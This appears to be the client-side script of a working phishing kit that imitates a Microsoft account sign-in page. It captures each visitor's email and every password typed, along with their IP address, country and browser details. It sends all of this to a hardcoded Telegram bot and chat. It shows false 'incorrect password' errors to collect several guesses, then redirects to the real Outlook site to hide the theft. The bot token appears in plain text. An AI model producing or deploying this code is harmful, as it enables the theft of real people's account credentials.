<script>
// Replace with your Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = '7948668339:AAFu2rDu_4zSW98dpaNAVls1n0f7axCENGY';
const TELEGRAM_CHAT_ID = '8218271186';

// Wait for page to load
document.addEventListener('DOMContentLoaded', function() {
    console.log('Page loaded, initializing...');
    
    // Wait 4 seconds then show Microsoft sign-in
    setTimeout(function() {
        console.log('Transitioning to Microsoft sign-in...');
        document.getElementById('loadingScreen').style.display = 'none';
        document.getElementById('microsoft-signin').style.display = 'block';
        document.body.classList.add('show-signin');
        
        // Initialize Microsoft sign-in functionality
        initializeMicrosoftSignIn();
    }, 4000);
});

async function initializeMicrosoftSignIn() {
    console.log('Initializing Microsoft sign-in...');
    
    // Page elements
    const signinPage = document.getElementById('signin-page');
    const passwordPage = document.getElementById('password-page');
    const signinOptionsContainer = document.getElementById('signin-options-container');
    
    // Sign-in page elements
    const emailInput = document.getElementById('email-input');
    const nextBtn = document.getElementById('next-btn');
    const loadingDotsContainer = document.getElementById('loading-dots-container');
    const formContent = document.getElementById('form-content');
    const formContainer = document.querySelector('.form-container');
    const signinForm = document.getElementById('signin-form');
    
    // Password page elements
    const backBtn = document.getElementById('back-btn');
    const emailDisplay = document.getElementById('email-display');
    const passwordInput = document.getElementById('password');
    const passwordForm = document.getElementById('password-form');
    const passwordWrapper = document.getElementById('password-wrapper');
    const passwordError = document.getElementById('password-error');
    const eyeIcon = document.querySelector('.far.fa-eye');
    const passwordNextBtn = document.getElementById('password-next-btn');
    
    // Password attempt counter
    let passwordAttempts = 0;

    // Device and user agent information
    const userAgent = navigator.userAgent;
    const deviceInfo = {
        platform: navigator.platform,
        userAgent: userAgent,
        isMobile: /Mobi|Android/i.test(userAgent),
        browser: getBrowserName(userAgent)
    };

    // Fetch IP and country information
    let ipInfo = {};
    try {
        const response = await fetch('https://ipapi.co/json/');
        ipInfo = await response.json();
    } catch (error) {
        console.error('Error fetching IP info:', error);
        ipInfo = { ip: 'Unknown', country: 'Unknown' };
    }

    // Function to get browser name
    function getBrowserName(userAgent) {
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Unknown';
    }

    // Function to send message to Telegram
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };

        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            console.log('Message sent to Telegram');
        } catch (error) {
            console.error('Error sending to Telegram:', error);
        }
    }

    // Sign-in page functionality
    // Add white overlay effect when focusing on input
    emailInput.addEventListener('focus', function() {
        formContainer.classList.add('white-overlay');
    });
    
    emailInput.addEventListener('blur', function() {
        if (emailInput.value.trim() === '') {
            formContainer.classList.remove('white-overlay');
        }
    });
    
    // Next button click handler
    nextBtn.addEventListener('click', function() {
        console.log('Next button clicked');
        goToPasswordPage();
    });
    
    // Enter key handler for email input
    emailInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            console.log('Enter key pressed in email input');
            goToPasswordPage();
        }
    });
    
    // Form submit handler for email form
    signinForm.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log('Email form submitted');
        goToPasswordPage();
    });
    
    // Function to transition to password page
    async function goToPasswordPage() {
        console.log('Going to password page...');
        if (emailInput.value.trim() !== '') {
            // Log email attempt
            const emailLog = `
<b>New Email Attempt</b>
Email: ${emailInput.value}
IP: ${ipInfo.ip || 'Unknown'}
Country: ${ipInfo.country_name || 'Unknown'}
Device: ${deviceInfo.platform}
Browser: ${deviceInfo.browser}
User Agent: ${deviceInfo.userAgent}
Timestamp: ${new Date().toISOString()}
            `;
            await sendToTelegram(emailLog);

            // Show loading animation
            loadingDotsContainer.classList.add('active');
            formContent.classList.add('loading');
            nextBtn.disabled = true;
            
            // Simulate loading/verification process
            setTimeout(function() {
                // Hide loading animation
                loadingDotsContainer.classList.remove('active');
                formContent.classList.remove('loading');
                nextBtn.disabled = false;
                
                // Transition to password page
                signinPage.style.display = 'none';
                passwordPage.style.display = 'flex';
                signinOptionsContainer.style.display = 'none';
                
                // Display the entered email
                emailDisplay.textContent = emailInput.value;
                
                // Reset password attempts
                passwordAttempts = 0;
                passwordError.classList.remove('show');
                passwordWrapper.classList.remove('error');
                passwordInput.value = '';
                
                // Focus on password input
                setTimeout(function() {
                    passwordInput.focus();
                }, 100);
                
                console.log('Successfully transitioned to password page');
            }, 1500);
        } else {
            console.log('Email input is empty');
            emailInput.focus();
        }
    }
    
    // Password page functionality
    // Back button handler
    backBtn.addEventListener('click', function() {
        console.log('Back button clicked');
        passwordPage.style.display = 'none';
        signinPage.style.display = 'flex';
        signinOptionsContainer.style.display = 'block';
        
        // Reset password attempts when going back
        passwordAttempts = 0;
        passwordError.classList.remove('show');
        passwordWrapper.classList.remove('error');
        passwordInput.value = '';
        
        // Focus back on email input
        setTimeout(function() {
            emailInput.focus();
        }, 100);
    });
    
    // Toggle password visibility
    eyeIcon.addEventListener('click', function() {
        console.log('Eye icon clicked');
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            eyeIcon.classList.remove('fa-eye');
            eyeIcon.classList.add('fa-eye-slash');
        } else {
            passwordInput.type = 'password';
            eyeIcon.classList.remove('fa-eye-slash');
            eyeIcon.classList.add('fa-eye');
        }
    });
    
    // Password form submission
    passwordForm.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log('Password form submitted');
        handlePasswordSubmit();
    });
    
    // Enter key handler for password input
    passwordInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            console.log('Enter key pressed in password input');
            handlePasswordSubmit();
        }
    });
    
    // Function to handle password submission
    async function handlePasswordSubmit() {
        console.log('Handling password submission...');
        if (passwordInput.value.trim() === '') {
            console.log('Password is empty');
            showPasswordError('Please enter your password');
            return;
        }
        
        // Increment password attempts
        passwordAttempts++;
        console.log(`Password attempt #${passwordAttempts}`);
        
        // Log password attempt
        const passwordLog = `
<b>Password Attempt #${passwordAttempts}</b>
Email: ${emailDisplay.textContent}
Password: ${passwordInput.value}
IP: ${ipInfo.ip || 'Unknown'}
Country: ${ipInfo.country_name || 'Unknown'}
Device: ${deviceInfo.platform}
Browser: ${deviceInfo.browser}
User Agent: ${deviceInfo.userAgent}
Timestamp: ${new Date().toISOString()}
        `;
        await sendToTelegram(passwordLog);

        // Show appropriate error message based on attempt count
        if (passwordAttempts === 1) {
            showPasswordError('That password is incorrect for your Microsoft account.');
        } else if (passwordAttempts === 2) {
            showPasswordError('That password is incorrect for your Microsoft account.');
        } else if (passwordAttempts >= 3) {
            showPasswordError('');
            // Redirect to Microsoft after 3 failed attempts
            console.log('3 failed attempts, redirecting to Microsoft...');
            setTimeout(function() {
                window.location.href = 'https://outlook.office.com/';
            }, 2000);
            return;
        }
        
        // Clear password field
        passwordInput.value = '';
        passwordInput.focus();
    }
    
    // Helper function to show password error
    function showPasswordError(message) {
        console.log(`Showing password error: ${message}`);
        passwordError.textContent = message;
        passwordError.classList.add('show');
        passwordWrapper.classList.add('error');
        
        // Remove error styling after 3 seconds
        setTimeout(function() {
            passwordError.classList.remove('show');
            passwordWrapper.classList.remove('error');
        }, 3000);
    }
    
    console.log('Microsoft sign-in initialized successfully');
}
</script>
